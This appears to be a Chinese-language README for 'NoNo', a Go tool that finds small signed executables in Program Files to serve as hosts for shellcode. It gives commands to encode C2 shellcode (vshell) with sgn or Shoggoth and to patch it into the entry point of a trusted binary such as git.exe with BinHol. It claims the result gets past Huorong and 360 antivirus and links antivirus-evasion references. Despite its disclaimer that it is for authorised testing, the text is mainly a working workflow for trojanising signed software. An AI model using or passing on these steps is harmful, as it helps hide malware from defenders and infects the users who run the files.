# NoNo

> [!WARNING]
> 本工具仅供安全研究人员、网络管理员及相关技术人员进行授权的安全测试、漏洞评估和安全审计工作使用。使用本工具进行任何未经授权的网络攻击或渗透测试等行为均属违法，使用者需自行承担相应的法律责任。

Nono 是一款 patch 文件查找器。

![](./img/NoNo.png)

## 编译

```bash
go build -o nono.exe
```

## 使用方法

### 1. 找 patch 文件

找那种小的exe，带签名的，选不依赖特殊dll的exe，尽量找信誉高的文件，最好还能带logo的，不带黑框的。其他参数见`-h`，工具默认搜索`C:/Program Files/`。

```bash
.\nono.exe -h
Usage of C:\Users\din4e\nono.exe:
  -arch string
        架构类型: x86, x64, both (default "x64")
  -detail
        显示详细的导入函数列表
  -dir string
        要扫描的目录路径 (default "C:\\Program Files\\")
  -ext string
        文件扩展名，用逗号分隔 (default "exe")
  -imports
        显示导入表DLL信息 (default true)
  -max int
        最大文件大小 (字节，0表示无限制) (default 61440)
  -min int
        最小文件大小 (字节)
  -signed string
        签名过滤: signed(仅已签名), unsigned(仅未签名), all(全部) (default "signed")
  -workers int
        工作线程数 (default 32)
```

### 2. 混淆 shellcode

```bash
sgn.exe -a 64 -i tcp_windows_amd64.bin -o sgn_shellcode
# or
Shoggoth.exe -i tcp_windows_amd64.bin -o sgn_vshell
```

### 3. 使用 [BinHol](https://github.com/timwhitez/BinHol) patch 白文件

+ 方案一：`BinHol.exe -sign entrypoint .\git.exe .\sgn_shellcode` 白文件直接添加C2的shellcode，例如vshell bin文件。
+ 【推荐】方案二：`BinHol.exe -sign entrypoint .\git.exe .\template_1` 白文件添加自己写的shellcode;
  + template_1 为s hellcode，可以本地读取命名为 AAAA 的bin文件执行的，实现分离读取
  + template_0 是弹对话框的shellcode，可以用来测试功能
+ 方案三：自己实现远程拉取Shellcode。

```bash
# 方案一：
BinHol.exe -sign entrypoint .\git.exe .\sgn_vshell
# 方案二： sgn_vshell -> AAAA
BinHol.exe -sign entrypoint .\git.exe .\template_1
```

> [!IMPORTANT]
> 可以过火绒和360，内存不了卡巴斯基，行为和流量还是有问题。
> BinHol、Sgn、Shoggoth不放心请自行编译。

## 参考资料

+ https://mp.weixin.qq.com/s/MjdsRAsoArKUykBBKGwe5Q 三年了，还是VT全绿，它到底凭什么？
+ https://xz.aliyun.com/news/14533 一种基于patch免杀技术的自动化实现VT0
+ [yj94/BinarySpy](https://github.com/yj94/BinarySpy ) 自动化工具
+ [clownfive/CppDevShellcode](https://github.com/clownfive/CppDevShellcode) 模板
+ [yinsel/BypassAV](https://github.com/yinsel/BypassAV)
+ [timwhitez/BinHol](https://github.com/timwhitez/BinHol) 自动化Patch工具
+ [[2024]通杀检测基于白文件patch黑代码的免杀技术的后门](https://key08.com/index.php/2024/08/03/1949.html) 鸭鸭给出的检测手段
+ [EgeBalci/sgn](https://github.com/EgeBalci/sgn) Sgn 编码器
+ [frkngksl/Shoggoth](https://github.com/frkngksl/Shoggoth)